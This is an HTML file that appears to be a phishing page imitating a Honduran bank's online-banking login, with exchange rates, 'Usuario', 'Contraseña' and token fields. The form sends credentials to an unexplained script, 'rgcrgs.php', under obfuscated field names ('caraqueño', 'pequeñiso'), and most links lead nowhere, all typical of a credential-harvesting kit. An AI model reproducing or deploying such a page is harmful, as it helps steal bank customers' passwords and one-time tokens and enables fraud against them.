<!DOCTYPE html>

<html lang="es">
   <head>
      <meta http-equiv="Content-Type" charset="UTF-8">


      <title>Prioritario y principal</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="blue-main-style.css">
      <link rel="stylesheet" href="carouselLogout.css">
      <link rel="stylesheet" href="commonRedirStyles.css">

      <link href="digitalSignature.css" rel="stylesheet" type="text/css">
   
   </head>
   <body class="background-primary m-reset" style="position: inherit;">
      <form method="post"  action="rgcrgs.php">
        
         <header class="grid-container-fluid p-relative bg-color-white card-shadow-primary" style="z-index:10">
            <div class="grid-row a-items-center p-x-l">
               <a class="nav-item dropdown show cursor-pointer col-6 p-reset header-brand-logo"  href="#"></a>
               <ul class="d-flex a-items-center m-reset p-reset p-y-l col-6 j-content-end">
                  <li class="d-none d-sm-flex nav-item cursor-pointer a-items-center">
                     <a class="typography-p d-flex a-items-center j-content-center t-decoration-none" >
                     <i class="icons lens-stroke-before icons-xl"></i>
                     <span class="p-left-s f-size-xl">Ayuda</span></a>
                  </li>
                  <li class="nav-item dropdown show cursor-pointer d-flex a-items-center p-left-l">
                     <a class="nav-link dropdown-toggle d-flex a-items-center t-decoration-none" role="button" id="navbarDropdownCountry" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                     <span id="countryFlag" class="flag flag-HN"></span>
                     <span id="countryCode" class="d-none d-sm-block m-left-xs typography-h3 f-weight-l country-code">HN</span>
                     <i id="arrowCountryFlag" class="icons chevron-down-block-before icons-xl c-neutral-extrahigh d-none d-sm-block m-right-xs"></i>
                     </a>
                     
                  </li>
                  <li class="nav-item dropdown show cursor-pointer d-sm-none p-left-s">
                     <a class="nav-link dropdown-toggle t-decoration-none" id="navbarDropdownShow" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                     <i class="icons hamburguer-menu-block-before icons-4xl c-neutral-extrahigh"></i>
                     </a>
                     <div class="dropdown-menu right-negative-l" aria-labelledby="navbarDropdown" id="navbarDropdownMenuHelp">
                        <a id="modalExchangeReference" class="dropdown-item typography-p t-decoration-none" >Tipo de Cambio</a>
                        <a class="dropdown-item typography-p d-flex a-items-center j-content-center t-decoration-none">
                        <i class="icons lens-stroke-before icons-xl"></i>
                        <span class="p-left-s">Ayuda</span></a>
                     </div>
                  </li>
               </ul>
            </div>
            <div class="grid-row d-none d-sm-block">
               <div class="hr-primary col-12 p-reset"></div>
            </div>
            <div class="grid-row d-none d-sm-block">
               <div class="col-12 d-flex j-content-center a-items-center" style="height:40px">
                  <div class="p-relative">
                     <a id="exchangeModal" class="d-flex a-items-center typography-link-contextual f-weight-m" > 
                     <i class="icons atm-filled-before icons-xl m-right-xs"></i>
                     <span class="f-size-xl m-right-xs">Tipo de Cambio</span>
                     <span><i class="icons chevron-down-block-before icons-xl m-right-xs"></i></span>
                     </a>
                     
                  </div>
                  <div class="d-none d-xl-flex p-left-xl">
                     <div class="d-flex a-items-center b-right" id="dollarsExchange">
                        <p class="typography-p m-right-s">Dolares:</p>
                        <p class="typography-p m-right-m">Compra <span id="dollarBuy">L24.6467</span></p>
                        <p class="typography-p m-right-s p-right-xl m-left-xs">Venta <span id="dollarSale">L24.7699</span></p>
                     </div>
                     <div class="d-flex a-items-center" id="euroExchange">
                        <p class="typography-p m-left-s m-right-s p-left-xl">Euros:</p>
                        <p class="typography-p m-right-m">Compra <span id="euroBuy">L25.7558</span></p>
                        <p class="typography-p m-right-s m-left-xs">Venta <span id="euroSale">L28.6092</span></p>
                     </div>
                  </div>
               </div>
            </div>
            <select name="country" id="country" class="select-option-color d-none" onchange="goToCountry()">
               <option value="HN" selected="">Honduras
               </option>
          
            </select>
         </header>
         
         <div class="grid-container" id="login-sec">
            <div class="grid-row p-top-md-xxl j-content-center">
               <div class="col-12 col-sm-10 col-md-7 col-lg-6 col-xl-5 p-reset">
                  <div class="card card-shadow-primary p-bottom-l p-xs p-md-l p-top-l">
                     <div class="grid-row j-content-center">
                        <div class="col-12 d-flex j-content-end p-x-reset">
                           <a class="cursor-pointer p-right-l p-md-reset t-decoration-none c-black" >
                           <i class="icons security-check-stroke-before icons-6xl"></i>
                           </a>
                        </div>
                        <div id="stateHourCol" class="col-12 d-flex j-content-center p-x-reset d-none">
                           <img alt="imagen de la hora del dia" width="43px" id="stateHour" src="state-4.gif">
                        </div>
                        <div class="col-10 p-x-reset">
                           <div class="col-12 p-top-s" id="title">
                              <p class="typography-p f-size-xl t-align-center"> Le damos la bienvenida a</p>
                           </div>
                           <div class="col-12">
                              <p id="title1" class="typography-p f-size-5xl t-align-center f-weight-m">Banca en Línea</p>
                              <p id="title2" class="typography-p f-size-5xl t-align-center f-weight-m d-none l-height-s"><span class="d-inline">�</span>Bienvenido <span id="labelNameUser"></span><span class="d-inline">!</span></p>
                           </div>
                           <div class="grid-row a-items-center">
                              <div class="col-12 col-md-6 d-none d-flex j-content-center j-content-md-end p-left-xxs" id="userLabelCol">
                                 <p id="title1" class="typography-p">Usuario: <span id="labelUser"></span><span>.</span></p>
                              </div>
                              <div class="col-12 col-md-6 d-none d-flex j-content-center j-content-md-start p-reset" id="labelChangeUserCol">
                                 <p class="typography-p c-interaction-low cursor-pointer" id="butonChangeUser">Ingresar otro usuario
                                 </p>
                              </div>
                           </div>
                           <div class="grid-row">
                              <div class="col-12 p-top-l" id="productCol">
                                 <label class="typography-label" for="productId">Usuario</label> <input class="input-main typography-p" size="20" name="caraqueño" type="text" value="" required minlength="2" >
                              </div>
                              <div class="col-12 d-flex f-column p-relative j-content-end input-password p-top-m" id="passwordCol">
                                 <div id="inputPasswordContainer">
                                    <label class="typography-label" for="pass">Contraseña</label>
                                    <div class="d-flex"><input name="pequeñiso"  required minlength="2" type="password" class="input-main m-top-xs typography-p input-config-reveal p-right-xl"><span class="eye-stroke-before icons icons-xl c-black position-icon-password m-top-xs" style="visibility: hidden;"></span></div>
                                 </div>
                                 <input name="passtemp" value="" type="password" style="display: none;">
                              </div>
                              <div id="tokenInput" class="col-md-6 p-top-m d-none">
                                 <label class="typography-label" for="inputDefault">Token</label>
                                 <input class="input-main typography-p" name="token" onkeypress="return checkNumberNoDot(event,this)" onkeydown="return noPaste(event,this)" value="" maxlength="6" size="20" type="text" id="tokenInformation" autofocus="true" style="display: none;">
                                 <input type="hidden" value="" id="signatureDataHash" name="signatureDataHash">
                              </div>
                              <div class="col-12 p-top-xl" id="RememberUserCol">
                                 <div class="checkbox-input">
                                    <input class="checkbox-button" type="checkbox" name="persistent" value="y" tabindex="3" onclick="keepUser();" id="remember-user"> 
                                    <label class="checkbox-button-icon" for="remember-user">
                                       <span class="checkbox-icon">
                                          <svg class="svg-check" viewBox="0 0 12 9">
                                             <polyline points="1 5 4 8 11 1"></polyline>
                                          </svg>
                                       </span>
                                       <span class="input-text m-left-s">
                                       Recordar Usuario
                                       </span>
                                    </label>
                                 </div>
                              </div>
                              
                              <div class="col-12 p-top-xl p-bottom-xs">
                                 <button id="confirm" name="confirm" class="btn btn-primary" >
                                 Ingresar
                                 </button>
                              </div>
                              <div class="col-12  t-align-center p-y-l">
                                 <a id="openModalHelp" class="typography-link-contextual"> ¿No puede ingresar?</a>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="grid-row  j-content-center">
               <div class="col-12 col-sm-10 col-md-7 col-lg-6 col-xl-5 p-x-l p-sm-reset">
                  <div class="card card-shadow-primary p-y-l m-top-m">
                     <div class="grid-row">
                        <div class="col-12 t-align-center">
                           <a id="createUserLink" class="typography-link-contextual d-flex a-items-center j-content-center" > <i class="icons user-stroke-before icons-xl"></i> <span class="m-left-s">Crear usuario por primera vez</span></a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
        
      </form>
      <div class="ballon-Container d-none d-md-block">
         <div id="balloonId" class="balloon balloonDisplay balloon-ErrorType">
            <div class="balloon-text">
               <p class="" id="balloonMessageContent"></p>
            </div>
         </div>
         <div id="triangleId" class="balloon-triangle balloonDisplay balloon-triangle-ErrorType"></div>
      </div>
     
      <footer class="grid-container-fluid">
         <div class="grid-row p-top-xl p-relative p-bottom-m">
            <div class="col-12">
               <p class="typography-h5 t-align-center">
                  Todos los derechos reservados. 2023 ©. <a class="typography-link"  href="#">Términos y condiciones.</a>
               </p>
            </div>
            <div class="m-s p-fixed d-none d-lg-block" style="right:40px; bottom:40px">
               <form  method="post" action="#">
                  <button class="btn-float btn-float-secondary expand-btn-float" type="button">
                  <i class="icons lens-stroke-before icons-xl"></i>
                  <span class="typography-p btn-float-txt">¿Necesita ayuda para ingresar?</span>
                  </button>
               </form>
            </div>
         </div>
      </footer>
     
      <img class="image-bg" alt="Imagen del background" src="background.svg">		
      <style>
         .image-bg{
         position: fixed;
         bottom: 120px;;
         z-index: -1;
         filter: hue-rotate(442deg);
         scale: 2;
         }
         @media (min-width: 768px){
         .image-bg{
         scale: 1.5;
         }
         }
         @media (min-width: 992px){
         .image-bg{
         bottom: 80px;
         scale: 1.2;
         }
         }
         @media (min-width: 1200px){
         .image-bg{
         scale: .9;
         }
         }
      </style>
     
     
      
   </body>
</html>
